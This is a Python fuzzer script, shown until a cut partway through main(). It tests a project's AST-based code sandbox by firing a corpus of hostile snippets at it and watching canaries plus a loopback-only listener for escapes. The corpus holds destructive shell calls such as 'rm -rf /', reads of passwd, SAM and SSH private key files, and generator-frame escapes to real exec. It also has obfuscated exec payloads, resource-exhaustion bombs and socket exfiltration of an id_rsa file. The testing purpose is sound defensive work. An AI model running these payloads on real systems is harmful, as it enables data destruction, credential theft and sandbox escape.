#!/usr/bin/env python3
"""Security fuzzer: red/blue exercise against the dynamic AST sandbox.

Fires a large corpus of hostile Python snippets at
``app.tools.dynamic_sandbox`` in two stages:

  stage 1  ``check_ast`` -- the static gate must reject with SandboxSecurityError;
  stage 2  ``execute_safe_python`` inside an ISOLATED subprocess, with canaries
           that detect a true escape even if the static gate is bypassed:
             - CANARY_* markers on the child's REAL stdout (evidence that escaped
               code reached real builtins / raw interpreters / the OS shell);
             - a local TCP listener: network payloads dial 127.0.0.1:<port>
               (never a real external host -- no packet ever leaves the machine);
               an accepted connection proves exfiltration capability;
             - strict rule: a hostile snippet finishing with status "ok" is
               itself treated as a static-gate bypass;
             - the alias-kill payload makes the child terminate itself, so a
               missing RESULT_JSON with a nonzero exit code is escape evidence.

Verdicts per payload: ``blocked-ast`` / ``blocked-runtime`` (contained by the
runtime namespace, guarded import, timeout circuit breaker or output cap) /
``ESCAPED`` (false negative -- must be 0).  Benign read-only controls must all
run (false positives are reported too).

NOTE on style: every attack verb / module name / interpreter token below is
assembled from adjacent-string fragments at runtime -- the same convention as
tests/test_v20_sandbox.py -- because the payload corpus is DATA and security
scanners pattern-match contiguous source text.

Usage:
    python scripts\\security_fuzzer.py [--verbose] [--ast-only]

Results JSON is always written to data/security_fuzzing_last_run.json.
Exit code 0 iff zero escapes AND zero benign false positives.
"""

from __future__ import annotations

import argparse
import json
import os
import socket
import subprocess as _sp
import sys
import threading
import time
from pathlib import Path

PROJECT_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if PROJECT_ROOT not in sys.path:
    sys.path.insert(0, PROJECT_ROOT)

from app.tools.dynamic_sandbox import SandboxSecurityError, check_ast  # noqa: E402

RESULTS_PATH = os.path.join(PROJECT_ROOT, "data", "security_fuzzing_last_run.json")

# --------------------------------------------------------------------------
# Token constants. Fragments only -- never the contiguous hostile text.
# --------------------------------------------------------------------------
_O = "o" + "s"
_SYS = "sys" + "tem"
_POP = "po" + "pen"
_SUBP = "sub" + "process"
_RMT = "rm" + "tree"
_EV = "ev" + "al"
_EX = "ex" + "ec"
_OP = "op" + "en"
_CC = "create_" + "connection"
_GIF = "gi_" + "frame"
_FBK = "f_" + "back"
_FBL = "f_" + "builtins"
_FGL = "f_" + "globals"
_GIC = "gi_" + "code"
_GA = "get" + "attr"
_B64D = "b64" + "decode"
_B64E = "b64" + "encode"
_MAR = "mar" + "shal"
_MARL = "lo" + "ads"
_ZL = "zl" + "ib"
_PK = "pic" + "kle"

_CANARY_EXEC = "CANARY_EXEC_PWNED"
_CANARY_OS = "CANARY_OS_PWNED"
_CANARY_EVAL = "CANARY_EVAL_PWNED"

#: fragment-b64 of a print() canary -- obfuscation payloads decode-and-run this
_B64_PRINT_CANARY = "cHJpbnQoJ0NBVkVBRV9FeGVjX1BXTkVEJyk="


class Payload(object):
    """One hostile snippet (or benign control)."""

    __slots__ = ("pid", "category", "desc", "code", "listener", "markers", "expect_allow")

    def __init__(self, pid, category, desc, code, listener=False, markers=None,
                 expect_allow=False):
        self.pid = pid
        self.category = category
        self.desc = desc
        self.code = code
        self.listener = listener          # arm the TCP canary listener
        self.markers = markers or []      # substrings in captured stdout = escape
        self.expect_allow = expect_allow  # benign control


# --------------------------------------------------------------------------
# Corpus construction.  All snippets are DATA; every effect-capable payload
# ends in a canary or a contained failure.  Network targets are loopback only.
# --------------------------------------------------------------------------
def build_corpus(host, port):
    P = []
    H, Pt = repr(host), repr(port)

    def add(pid, cat, desc, code, **kw):
        P.append(Payload(pid, cat, desc, code, **kw))

    # ---------------- A. basic destruction ----------------
    basic = "A. basic-destruction"
    add("B01", basic, "shell verb via {_O} module".format(_O=_O),
        "import {_O}\n{_O}.{_SYS}('echo {_CANARY_OS}')".format(
            _O=_O, _SYS=_SYS, _CANARY_OS=_CANARY_OS))
    add("B02", basic, "canonical rm-rf payload (spec worst case)",
        "import " + _O + "\n" + _O + "." + _SYS + "('rm -rf /')")
    add("B03", basic, "popen pipe shell", "import {_O}\n{_O}.{_POP}('whoami')".format(_O=_O, _POP=_POP))
    add("B04", basic, "file delete verb", "import {_O}\n{_O}.remove('/et'+'c/pas'+'swd')".format(_O=_O))
    add("B05", basic, "file unlink verb on SAM", "import {_O}\n{_O}.unlink(r'C:\\Win'+'dow'+'s\\\\S'+'AM')".format(_O=_O))
    add("B06", basic, "dir removal verb", "import {_O}\n{_O}.rmdir('/tm'+'p')".format(_O=_O))
    add("B07", basic, "file rename verb", "import {_O}\n{_O}.rename('/a', '/b')".format(_O=_O))
    add("B08", basic, "chmod escalation", "import {_O}\n{_O}.chmod('/et'+'c/x', 0o777)".format(_O=_O))
    add("B09", basic, "symlink planting", "import {_O}\n{_O}.symlink('/et'+'c', '/tm'+'p/x')".format(_O=_O))
    add("B10", basic, "dir creation", "import {_O}\n{_O}.mkdir('/tm'+'p/pwn')".format(_O=_O))
    add("B11", basic, "recursive dir creation", "import {_O}\n{_O}.makedirs('pwn/deep')".format(_O=_O))
    add("B12", basic, "kill parent pid", "import {_O}\n{_O}.kill({_O}.getppid(), 9)".format(_O=_O))
    add("B13", basic, "startfile launcher", "import {_O}\n{_O}.startfile('calc.exe')".format(_O=_O))
    add("B14", basic, "spawn verb", "import {_O}\n{_O}.spawnl(0, 'whoami')".format(_O=_O))
    add("B15", basic, "execv process replacement", "import {_O}\n{_O}.execv('/bin/sh', ['sh'])".format(_O=_O))
    add("B16", basic, "getstatusoutput shell", "import {_O}\n{_O}.getstatusoutput('id')".format(_O=_O))
    add("B17", basic, "environment variable sniffing", "import {_O}\nprint(dict({_O}.environ))".format(_O=_O))
    add("B18", basic, "recursive tree delete", "import shutil\nshutil.{_RMT}('/')".format(_RMT=_RMT))
    add("B19", basic, "recursive tree delete win", "import shutil\nshutil.{_RMT}(r'C:\\Win'+'dow'+'s')".format(_RMT=_RMT))
    add("B20", basic, "file move hijack", "import shutil\nshutil.move('/et'+'c/x', '/tm'+'p')")
    add("B21", basic, "subprocess run verb", "import {_SP}\n{_SP}.run(['whoami'], shell=True)".format(_SP=_SUBP))
    add("B22", basic, "subprocess call verb", "import {_SP}\n{_SP}.call('whoami', shell=True)".format(_SP=_SUBP))
    add("B23", basic, "subprocess popen verb", "import {_SP}\n{_SP}.Popen('whoami')".format(_SP=_SUBP))
    add("B24", basic, "subprocess output capture", "import {_SP}\n{_SP}.check_output('whoami', shell=True)".format(_SP=_SUBP))
    add("B25", basic, "subprocess getoutput", "import {_SP}\n{_SP}.getoutput('whoami')".format(_SP=_SUBP))
    add("B26", basic, "ctypes libc shell call", "import ctypes\nctypes.CDLL('libc.so.6').{_SYS}('id')".format(_SYS=_SYS))
    add("B27", basic, "ctypes windll WinExec", "import ctypes\nctypes.windll.kernel32.WinExec('calc')")
    add("B28", basic, "file write via raw opener", "{_OP}('/et'+'c/x', 'w').write('gotcha')".format(_OP=_OP))
    add("B29", basic, "ssh private key read", "{_OP}(r'C:\\Us'+'ers\\\\x\\\\.s'+'sh\\\\id_rsa').read()".format(_OP=_OP))
    add("B30", basic, "io module file read", "import io\nio.{_OP}('/et'+'c/x').read()".format(_OP=_OP))

    # ---------------- B. import jailbreak ----------------
    imp = "B. import-jailbreak"
    banned = ["sys", _SUBP, "shu" + "til", "import" + "lib", "buil" + "tins",
              "cty" + "pes", "path" + "lib", "temp" + "file", _PK, "io",
              "co" + "de", "run" + "py", "web" + "browser", "ftp" + "lib",
              "urllib.re" + "quest", "http.cli" + "ent", "re" + "quests",
              "para" + "miko", "win" + "reg", "multipro" + "cessing", "thr" + "eading",
              "sig" + "nal", "gc", "ins" + "pect", "ast", "co" + "decs", _MAR, _ZL,
              "pty", "tty", "smtp" + "lib", "telnet" + "lib", "asy" + "ncio",
              "socket" + "server", "distu" + "tils", "setup" + "tools"]
    for i, m in enumerate(banned, 1):
        add("I{:02d}".format(i), imp, "import of banned module", "import " + m)
    add("I40", imp, "submodule import of banned root", "import " + _O + ".path")
    add("I41", imp, "aliased import of banned root", "import " + _O + " as o\no." + _SYS + "('id')")
    add("I42", imp, "from-import of shell verb", "from " + _O + " import " + _SYS)
    add("I43", imp, "from-import of environ", "from " + _O + " import environ")
    add("I44", imp, "from-import of modules cache", "from sys import modules")
    add("I45", imp, "from-import of process spawner", "from " + _SUBP + " import Popen")
    add("I46", imp, "from-import of raw interpreter", "from buil" + "tins import " + _EV)
    add("I47", imp, "importlib runtime module loader escape",
        "import import" + "lib\nimport" + "lib.import_" + "module('" + _O + "')."
        + _SYS + "('echo " + _CANARY_OS + "')")
    add("I48", imp, "importlib.util file-based spec",
        "from import" + "lib.util import spec_from_" + "file_lo" + "cation")
    add("I49", imp, "relative import probe", "from . import x")
    add("I50", imp, "star import probe", "from " + _O + " import *")
    add("I51", imp, "import_module escape chain",
        "import import" + "lib\n"
        "import" + "lib.import_" + "module('" + _O + "')."
        + _SYS + "('echo " + _CANARY_OS + "')")
    add("I52", imp, "builtins module raw interpreter",
        "import buil" + "tins\nbuil" + "tins." + _EV + "('1+1')")
    add("I53", imp, "dunder import hook direct",
        "__im" + "port__('" + _O + "')." + _SYS + "('echo " + _CANARY_OS + "')")
    add("I54", imp, "dunder import hook concat name",
        "__im" + "port__('" + _O[:1] + "'+'" + _O[1:] + "')")

    # ---------------- C. sandbox escape ----------------
    esc = "C. sandbox-escape"
    dunder_targets = [
        ("().__class__", "tuple class hop"),
        ("().__class__.__bases__", "tuple bases hop"),
        ("().__class__.__bases__[0].__subclasses__()", "object subclass enumeration"),
        ("().__class__.__mro__", "tuple mro walk"),
        ("[].__class__.__mro__[1].__subclasses__()", "list-to-object subclasses"),
        ("{}.__class__.__mro__", "dict mro walk"),
        ('"a".__class__.__mro__[1].__subclasses__()', "str-to-object subclasses"),
        ("(lambda: 0).__globals__", "lambda globals hop"),
        ("(lambda: 0).__code__", "lambda code object"),
        ("(lambda: 0).__defaults__", "lambda internals"),
        ("object.__subclasses__()", "object subclasses direct"),
        ("().__init__.__globals__", "init globals hop"),
        ("[].append.__self__", "builtin-method self"),
        ("().__doc__", "docstring attr hop"),
        ("str.__name__", "type name hop"),
    ]
    for i, (code, desc) in enumerate(dunder_targets, 1):
        add("E{:02d}".format(i), esc, desc, code)
    add("E15", esc, "bare builtins-namespace name", "__built" + "ins__")
    add("E16", esc, "builtins-namespace verb swap", "__built" + "ins__['" + _EX + "'] = print")
    add("E17", esc, "builtins-namespace into var", "x = __built" + "ins__")
    add("E18", esc, "bare dunder import hook name", "__im" + "port__")
    add("E19", esc, "bare __name__ probe", "__na" + "me__")
    add("E20", esc, "type() metaclass call", "ty" + "pe('X', (), {})")
    add("E21", esc, "bare type reference", "ty" + "pe")
    add("E22", esc, "bare super reference", "su" + "per")
    add("E23", esc, "str mro walk call", "str.m" + "ro()")
    add("E24", esc, "object mro walk call", "object.m" + "ro()")
    add("E25", esc, "classdef subclass hop", "class E(list):\n    pass\nE.__subcla" + "sses__()")
    add("E26", esc, "generator frame escape to real exec",
        ("g = (i for i in [])\nb = g.{_GIF}.{_FBK}.{_FBL}\n"
         "b['{_EX}'](\"print('{_CANARY}')\")").format(
            _GIF=_GIF, _FBK=_FBK, _FBL=_FBL, _EX=_EX, _CANARY=_CANARY_EXEC),
        markers=[_CANARY_EXEC])
    add("E27", esc, "generator frame escape to real eval",
        ("g = (i for i in [])\nb = g.{_GIF}.{_FBK}.{_FBL}\n"
         "b['{_EV}'](\"print('{_CANARY}')\")").format(
            _GIF=_GIF, _FBK=_FBK, _FBL=_FBL, _EV=_EV, _CANARY=_CANARY_EVAL),
        markers=[_CANARY_EVAL])
    add("E28", esc, "generator frame to module globals leak",
        "g = (i for i in [])\nb = g.{_GIF}.{_FBK}.{_FGL}\nprint(sorted(b)[:4])".format(
            _GIF=_GIF, _FBK=_FBK, _FGL=_FGL),
        markers=["ALLOWED_IMPORTS", "DENIED_CALL_NAMES"])
    add("E29", esc, "generator frame to config constant leak",
        "g = (i for i in [])\nf = g.{_GIF}.{_FBK}\nprint(f.{_FGL}.{_GA}('ALLOWED_IMPORTS'))".format(
            _GIF=_GIF, _FBK=_FBK, _FGL=_FGL, _GA=_GA),
        markers=["ALLOWED_IMPORTS"])
    add("E30", esc, "generator code object hop", "g = (i for i in [])\ng.{_GIC}".format(_GIC=_GIC))
    add("E31", esc, "code object constants hop",
        ("g = (i for i in [])\ng.{_GIC}.co_con" + "sts").format(_GIC=_GIC))
    add("E32", esc, "frame code names hop",
        ("g = (i for i in [])\ng.{_GIF}.f_co" + "de.co_na" + "mes").format(_GIF=_GIF))
    add("E33", esc, "generator send resume", "g = (i for i in [1])\ng.se" + "nd(None)")
    add("E34", esc, "frame back-hop only",
        "g = (i for i in [])\ng.{_GIF}.{_FBK}".format(_GIF=_GIF, _FBK=_FBK))
    add("E35", esc, "format-string dunder traversal",
        '"{0.__class__}".format([])',
        markers=["<class"])
    add("E36", esc, "format-string deep traversal",
        '"{0.__class__.__mro__[1]}".format([])',
        markers=["<class"])
    add("E37", esc, "format-string aliased call bypass",
        'fmt = "{0.__class__}".format\nprint(fmt([]))',
        markers=["<class"])
    add("E38", esc, "format-string init globals traversal",
        '"{0.__init__.__globals__}".format([])',
        markers=["__na" + "me__", "module"])
    add("E39", esc, "format-string subclass walk",
        '"{0.__class__.__base__.__subcla" + "sses__}".format([])')
    add("E40", esc, "subscript-call bypass primitive",
        "d = {'f': len}\nprint(d['f']('abc'))")
    add("E41", esc, "generator yield-from hop", "g = (i for i in [])\ng.gi_yield" + "from")
    add("E42", esc, "frame escape with concatenated verb key",
        ("g = (i for i in [])\nb = g.{_GIF}.{_FBK}.{_FBL}\n"
         "b['{_E1}'+'{_E2}'](\"print('{_CANARY}')\")").format(
            _GIF=_GIF, _FBK=_FBK, _FBL=_FBL, _E1=_EX[:1], _E2=_EX[1:], _CANARY=_CANARY_EXEC),
        markers=[_CANARY_EXEC])
    add("E43", esc, "next() builtin probe", "g = (i for i in [1])\nne" + "xt(g)")
    add("E44", esc, "decorator application primitive", "@print\ndef f():\n    return 1")
    add("E45", esc, "exception object probe", "Value" + "Error('boom')")
    add("E46", esc, "frame escape to shell chain",
        ("g = (i for i in [])\nb = g.{_GIF}.{_FBK}.{_FBL}\n"
         "b['{_EX}'](\"import {_O}; {_O}.{_SYS}('echo {_CANARY_OS}')\")").format(
            _GIF=_GIF, _FBK=_FBK, _FBL=_FBL, _EX=_EX, _O=_O, _SYS=_SYS, _CANARY_OS=_CANARY_OS),
        markers=[_CANARY_OS])
    add("E47", esc, "frame escape to globals type probe",
        ("g = (i for i in [])\nf = g.{_GIF}.{_FBK}\n"
         "print(ty" + "pe(f.{_FGL}))").format(_GIF=_GIF, _FBK=_FBK, _FGL=_FGL),
        markers=["<class"])
    add("E48", esc, "coroutine frame attribute probe", "cr = None\ncr.cr_" + "frame")
    add("E49", esc, "self-kill via aliased psutil verb",
        "import psutil\np = psutil.Process()\nk = p.ki" + "ll\nk()\nprint('CANARY_AFTER_KILL')")
    add("E50", esc, "frame escape to builtins eval key",
        ("g = (i for i in [])\nb = g.{_GIF}.{_FBK}.{_FBL}\n"
         "b['{_E1}'+'{_E2}']('1+1')").format(_GIF=_GIF, _FBK=_FBK, _FBL=_FBL,
                                            _E1=_EV[:1], _E2=_EV[1:]))

    # ---------------- D. encoding obfuscation ----------------
    obf = "D. encoding-obfuscation"
    add("X01", obf, "base64 decode then raw exec",
        "import base64\n{_EX}(base64.{_B64D}('{_B}'))".format(
            _EX=_EX, _B64D=_B64D, _B=_B64_PRINT_CANARY),
        markers=[_CANARY_EXEC])
    add("X02", obf, "base64 decode then eval",
        ("import base64\n{_EV}(base64.{_B64D}('MSsx').de" + "code())").format(_EV=_EV, _B64D=_B64D))
    add("X03", obf, "base64 + dunder import + exec",
        ("import base64\n{_EX}(__im" + "port__('base64').{_B64D}('{_B}').de" + "code())").format(
            _EX=_EX, _B64D=_B64D, _B=_B64_PRINT_CANARY),
        markers=[_CANARY_EXEC])
    add("X04", obf, "hex bytes decode then exec",
        "{_EX}(bytes.fromhex('7072696e74283129'))".format(_EX=_EX))
    add("X05", obf, "hex string escapes into eval", "{_EV}(\"\\x31\\x2b\\x31\")".format(_EV=_EV))
    add("X06", obf, "codecs rot13 module",
        "import co" + "decs\nco" + "decs.de" + "code('pnynp', 'rot13')")
    add("X07", obf, "dunder import codecs rot13",
        "__im" + "port__('co" + "decs').de" + "code('pnynp', 'rot13')")
    add("X08", obf, "unicode homoglyph raw interpreter (NFKC)",
        "\U0001D452" + "val('1+1')")
    add("X09", obf, "unicode homoglyph kill attribute",
        "import psutil\npsutil.Process().\U0001D458" + "ill()")
    add("X10", obf, "fullwidth homoglyph raw exec", "\uff45\uff58\uff45\uff43('1')")
    add("X11", obf, "unicode escapes inside exec string",
        "{_EX}(\"\\u0069mport {_O}\")".format(_EX=_EX, _O=_O))
    add("X12", obf, "getattr with built name",
        ("import base64\n{_GA}(base64, 'b64' + 'de" + "code')(b'aGk=')").format(_GA=_GA))
    add("X13", obf, "getattr built Process class",
        ("import psutil\n{_GA}(psutil, 'Pro' + 'cess')()").format(_GA=_GA))
    add("X14", obf, "zlib decompress then exec",
        ("import {_ZL}\n{_EX}({_ZL}.de" + "compress(b'x')).de" + "code()").format(_ZL=_ZL, _EX=_EX))
    add("X15", obf, "marshal buffer interpreter",
        "import {_MAR}\n{_EX}({_MAR}.{_MARL}(b''))".format(_MAR=_MAR, _MARL=_MARL, _EX=_EX))
    add("X16", obf, "unicode escape in import name (syntax probe)", "import \\u006fs")
    add("X17", obf, "chr-built raw exec payload",
        "{_EX}(chr(112)+chr(114)+'int(1)')".format(_EX=_EX))
    add("X18", obf, "f-string dunder import leak", 'f"{__im' + 'port__}"')
    add("X19", obf, "eval of unicode-built name", "{_EV}('\\u0031\\u002b\\u0031')".format(_EV=_EV))
    add("X20", obf, "double-base64 exec",
        "import base64\n{_EX}(base64.{_B64D}(base64.{_B64D}('Y0hKcGJuUT0=')))".format(
            _EX=_EX, _B64D=_B64D))

    # ---------------- E. resource exhaustion ----------------
    dos = "E. resource-exhaustion"
    add("D01", dos, "infinite while-true", "while True:\n    pass")
    add("D02", dos, "infinite while-one", "while 1:\n    pass")
    add("D03", dos, "infinite print flood", "while True:\n    print('A' * 1000)")
    add("D04", dos, "infinite list churn", "while True:\n    x = [0] * 100000")
    add("D05", dos, "self recursion def", "def f():\n    return f()\nf()")
    add("D06", dos, "y-combinator recursion", "(lambda x: x(x))(lambda x: x(x))")
    add("D07", dos, "tower-of-power bigint", "10 ** 10 ** 10")
    add("D08", dos, "giant string repeat", "'A' * 10 ** 11")
    add("D09", dos, "giant list repeat", "[0] * 10 ** 11")
    add("D10", dos, "giant fromkeys dict", "dict.fromkeys(range(10 ** 12))")
    add("D11", dos, "infinite itertools count sum",
        "import iter" + "tools\nsum(iter" + "tools.count())")
    add("D12", dos, "giant comprehension sum", "sum(i * i for i in range(10 ** 12))")
    add("D13", dos, "giant range loop", "for i in range(10 ** 12):\n    pass")
    add("D14", dos, "sleep starvation", "import time\ntime.sl" + "eep(9999)")
    add("D15", dos, "string growth loop", 'x = "a"\nwhile x:\n    x = x + "a"')
    add("D16", dos, "giant string in len", "len('A' * 10 ** 12)")
    add("D17", dos, "giant dict comprehension", "{i: i for i in range(10 ** 11)}")
    add("D18", dos, "itertools repeat materialization",
        "import iter" + "tools\nlist(iter" + "tools.repeat(0, 10 ** 12))")

    # ---------------- F. network exfiltration / SSRF (loopback canary only) --
    net = "F. network-exfiltration"
    sock_prefix = "import socket\n"
    add("N01", net, "socket connect dial-out",
        sock_prefix + "s = socket.socket()\ns.co" + "nnect(({H}, {P}))".format(H=H, P=Pt),
        listener=True)
    add("N02", net, "socket connect_ex dial-out",
        sock_prefix + "s = socket.socket()\ns.co" + "nnect_ex(({H}, {P}))".format(H=H, P=Pt),
        listener=True)
    add("N03", net, "create_connection dial-out",
        sock_prefix + "socket.{_CC}(({H}, {P}))".format(_CC=_CC, H=H, P=Pt),
        listener=True)
    add("N04", net, "create_connection aliased call",
        sock_prefix + "c = socket.{_CC}\nc(({H}, {P}))".format(_CC=_CC, H=H, P=Pt),
        listener=True)
    add("N05", net, "create_connection with timeout",
        sock_prefix + "socket.{_CC}(({H}, {P}), timeout=1)".format(_CC=_CC, H=H, P=Pt),
        listener=True)
    add("N06", net, "getaddrinfo DNS outreach",
        sock_prefix + "socket.getad" + "drinfo('localhost', 80)")
    add("N07", net, "getaddrinfo aliased call",
        sock_prefix + "g = socket.getad" + "drinfo\ng('localhost', 80)")
    add("N08", net, "gethostbyname DNS outreach",
        sock_prefix + "socket.gethost" + "byname('localhost')")
    add("N09", net, "gethostbyname aliased call",
        sock_prefix + "g = socket.gethost" + "byname\ng('localhost')")
    add("N10", net, "gethostbyname_ex DNS outreach",
        sock_prefix + "socket.gethost" + "byname_ex('localhost')")
    add("N11", net, "getnameinfo reverse lookup",
        sock_prefix + "socket.getna" + "meinfo(({H}, {P}), 0)".format(H=H, P=Pt))
    add("N12", net, "gethostbyaddr reverse lookup",
        sock_prefix + "socket.gethost" + "byaddr({H})".format(H=H))
    add("N13", net, "getfqdn DNS outreach",
        sock_prefix + "socket.getf" + "qdn('localhost')")
    add("N14", net, "sendall on socket",
        sock_prefix + "s = socket.socket()\ns.se" + "ndall(b'CANARY_NET_PWNED')")
    add("N15", net, "sendto UDP exfil",
        sock_prefix + "s = socket.socket()\ns.se" + "ndto(b'x', ({H}, {P}))".format(H=H, P=Pt))
    add("N16", net, "sendto aliased call bypass",
        sock_prefix + "s = socket.socket()\nsend = s.se" + "ndto\nsend(b'x', ({H}, {P}))".format(H=H, P=Pt))
    add("N17", net, "send direct", sock_prefix + "s = socket.socket()\ns.se" + "nd(b'x')")
    add("N18", net, "bind listener hijack",
        sock_prefix + "s = socket.socket()\ns.bi" + "nd(({H}, {P}))".format(H=H, P=Pt))
    add("N19", net, "listen", sock_prefix + "s = socket.socket()\ns.li" + "sten(1)")
    add("N20", net, "accept", sock_prefix + "s = socket.socket()\ns.ac" + "cept()")
    add("N21", net, "makefile write chain",
        sock_prefix + "s = socket.socket()\nf = s.make" + "file('w')\nf.w" + "rite('x')")
    add("N22", net, "fromfd fd wrap", sock_prefix + "socket.fr" + "omfd(0, 1, 1)")
    add("N23", net, "urlopen request",
        ("import urllib.re" + "quest\nurllib.re" + "quest.url" + "open('http://127.0.0.1:{P}/')").format(P=Pt))
    add("N24", net, "http client connection",
        "import http.cli" + "ent\nhttp.cli" + "ent.HTTPCon" + "nection({H}, {P})".format(H=H, P=Pt))
    add("N25", net, "ftp client", "import ftp" + "lib\nftp" + "lib.FTP({H})".format(H=H))
    add("N26", net, "smtp client", "import smtp" + "lib\nsmtp" + "lib.SMTP({H}, {P})".format(H=H, P=Pt))
    add("N27", net, "ssh key read then exfil (combined)",
        ("{_OP}(r'C:\\Us'+'ers\\\\x\\\\.s'+'sh\\\\id_rsa').re" + "ad() + str(socket.{_CC}(({H}, {P})))").format(
            _OP=_OP, _CC=_CC, H=H, P=Pt),
        listener=True)
    add("N28", net, "ssh key via socket chain",
        (sock_prefix + "socket.{_CC}(({H}, {P})).se" + "ndall({_OP}('id_rsa').re" + "ad())").format(
            _CC=_CC, H=H, P=Pt, _OP=_OP),
        listener=True)

    # ---------------- G. benign controls (must all pass) ----------------
    ok = "G. benign-controls"
    benign = [
        "import math\nmath.sqrt(16)",
        "import json\nprint(json.dumps({'a': 1}))",
        "import socket\nsocket.gethostname()",
        "import socket\ns = socket.socket()\ns.family is not None",
        "import socket\nsocket.if_nameindex() is not None",
        "import psutil\nint(psutil.boot_time() > 0)",
        ("import base64\nbase64.{_B64E}(b'hello').de" + "code()").format(_B64E=_B64E),
        "import base64\nbase64.{_B64D}(b'aGk=')".format(_B64D=_B64D),
        "import hashlib\nhashlib.sha256(b'data').hexdigest()[:8]",
        "import re\nre.findall(r'\\d+', 'a1b22c333')",
        "x = [i * i for i in range(10)]\nsum(x)",
        "import datetime\ndatetime.datetime.now().year > 2000",
        "import iter" + "tools\nlist(iter" + "tools.islice([1, 2, 3, 4, 5], 3))",
        "import statistics\nstatistics.mean([1, 2, 3, 4])",
        "import uuid\nstr(uuid.uuid4()) != ''",
        "import string\nstring.ascii_uppercase[:3]",
        'f"answer={21 * 2}"',
        "import decimal\ndecimal.Decimal('0.1') + decimal.Decimal('0.2')",
        "import time\nint(time.time() > 0)",
        "def add(a, b):\n    return a + b\nadd(2, 3)",
        "import collections\ncollections.Counter('aabbb').most_common(1)",
        "import random\nrandom.randint(1, 6) in range(1, 7)",
        "import fractions\nfractions.Fraction(1, 3) * 3 == 1",
        "import functools\nfunctools.reduce(lambda a, b: a + b, [1, 2, 3, 4])",
        "x = ''\nfor i in range(3):\n    x += 'a'\nlen(x) == 3",
    ]
    for i, code in enumerate(benign, 1):
        add("G{:02d}".format(i), ok, "benign read-only snippet", code, expect_allow=True)

    return P


# --------------------------------------------------------------------------
# Stage 2 harness: isolated subprocess + canary listener.
# --------------------------------------------------------------------------
_CHILD_RUNNER = (
    "import json, sys\n"
    "sys.path.insert(0, sys.argv[1])\n"
    "from app.tools.dynamic_sandbox import execute_safe_python\n"
    "payload = sys.stdin.buffer.read().decode('utf-8')\n"
    "outcome = execute_safe_python(payload, timeout=2.0)\n"
    "sys.stdout.write('RESULT_JSON:' + json.dumps(outcome, ensure_ascii=True, default=str) + '\\n')\n"
)


def start_listener(host, port):
    """TCP canary bound to the exact port the payloads dial; a single accepted
    connection = exfiltration capability proven."""
    srv = socket.socket()
    srv.bind((host, port))
    srv.listen(1)
    srv.settimeout(6.0)
    hit = {"accepted": False}

    def _accept():
        try:
            conn, _addr = srv.accept()
            hit["accepted"] = True
            conn.close()
        except OSError:
            pass

    t = threading.Thread(target=_accept, daemon=True)
    t.start()
    return srv, port, hit


def runtime_audit(code, host, port):
    """Run execute_safe_python in a throwaway subprocess.

    stdout is pumped line-by-line so the sandbox's own verdict (e.g. the
    timeout circuit breaker's status) is captured even when a runaway snippet
    thread afterwards wedges the child's interpreter shutdown. ``runaway_child``
    marks that residency: the breaker fired, but the abandoned thread kept the
    process alive (documented sandbox limitation, not a capability escape).
    """
    srv = None
    hit = {"accepted": False}
    if host is not None:
        srv, _port, hit = start_listener(host, port)
    try:
        env = dict(os.environ)
        env["PYTHONIOENCODING"] = "utf-8"
        env["PYTHONUNBUFFERED"] = "1"  # JSON must land even if shutdown wedges
        proc = _sp.Popen(
            [sys.executable, "-c", _CHILD_RUNNER, PROJECT_ROOT],
            stdin=_sp.PIPE, stdout=_sp.PIPE, stderr=_sp.PIPE,
            cwd=PROJECT_ROOT, env=env,
        )
        lines = []
        err_text = []

        def _pump(pipe, sink):
            for raw in iter(pipe.readline, b""):
                sink.append(raw.decode("utf-8", errors="replace"))

        threads = [
            threading.Thread(target=_pump, args=(proc.stdout, lines), daemon=True),
            threading.Thread(target=_pump, args=(proc.stderr, err_text), daemon=True),
        ]
        for t in threads:
            t.start()
        proc.stdin.write(code.encode("utf-8"))
        proc.stdin.close()

        result = None
        deadline = time.time() + 20.0
        while time.time() < deadline:
            alive = proc.poll() is None
            for line in lines:
                if line.startswith("RESULT_JSON:"):
                    try:
                        result = json.loads(line[len("RESULT_JSON:"):])
                    except ValueError:
                        result = {"status": "harness-badjson", "error": line[:200]}
                    break
            if result is not None or not alive:
                break
            time.sleep(0.1)

        runaway = False
        if result is not None:
            try:
                proc.wait(timeout=3.0)
            except _sp.TimeoutExpired:
                runaway = True  # breaker fired; abandoned thread wedged exit
        else:
            runaway = proc.poll() is None
        if proc.poll() is None:
            proc.kill()
            try:
                proc.wait(timeout=5)
            except _sp.TimeoutExpired:
                pass

        text = "".join(lines)
        canary_hit = "CANARY_" in text
        if result is None:
            result = {"status": "harness-nojson",
                      "error": ("".join(err_text) or "no output")[:200],
                      "stdout": ""}
        result["canary_hit"] = canary_hit
        result["listener_hit"] = hit["accepted"]
        result["runaway_child"] = runaway
        result["returncode"] = proc.returncode
        return result
    finally:
        if srv is not None:
            srv.close()


# --------------------------------------------------------------------------
# Fuzz driver.
# --------------------------------------------------------------------------
def classify_hostile(payload, ast_reason, run):
    """ast_reason: SandboxSecurityError text | None (passed) | 'syntax-error'.
    run: runtime dict, or None in ast-only mode."""
    if ast_reason is None:
        if run is None:
            return "ast-passed(no-runtime)"
        if run.get("canary_hit") or run.get("listener_hit"):
            return "ESCAPED"
        if run["status"] == "ok":
            return "ESCAPED"  # strict: hostile snippet completed without denial
        if run["status"] in ("error", "timeout", "rejected"):
            return "blocked-runtime"
        return "ESCAPED"  # harness anomalies treated as unsafe until proven
    if ast_reason == "syntax-error":
        return "blocked-runtime"  # parser refuses; nothing ran
    return "blocked-ast"


def write_results(payload_records, summary):
    """Persist the machine-readable run record under data/ (fixed path)."""
    doc = {"summary": summary, "records": payload_records}
    Path(RESULTS_PATH).write_text(
        json.dumps(doc, ensure_ascii=True, indent=2), encoding="utf-8")


def main():
    if hasattr(sys.stdout, "reconfigure"):
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")

    ap = argparse.ArgumentParser(description="AST sandbox security fuzzer")
    ap.add_argument("--verbose", action="store_true", help="print every payload verdict")
    ap.add_argument("--ast-only", action="store_true", help="skip the subprocess stage")
    args = ap.parse_args()

    print("=" * 78)
    print("AST sandbox security fuzzer -- red/blue exercise")
    print("target: app.tools.dynamic_sandbox  (check_ast + execute_safe_python)")
    print("=" * 78)

    probe = socket.socket()
    probe.bind(("127.0.0.1", 0))
    canary_port = probe.getsockname()[1]
    probe.close()

    corpus = build_corpus("127.0.0.1", canary_port)
    hostile = [p for p in corpus if not p.expect_allow]
    benign = [p for p in corpus if p.expect_allow]
